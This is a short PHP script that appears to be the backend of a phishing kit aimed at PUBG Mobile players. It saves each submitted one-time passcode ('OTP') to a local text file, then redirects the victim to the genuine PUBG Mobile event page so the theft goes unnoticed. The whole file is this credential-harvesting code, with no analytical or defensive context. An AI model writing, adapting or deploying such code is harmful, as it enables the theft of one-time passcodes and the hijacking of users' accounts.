<?php

file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://www.pubgmobile.com/act/a20180515iggame/');
exit();
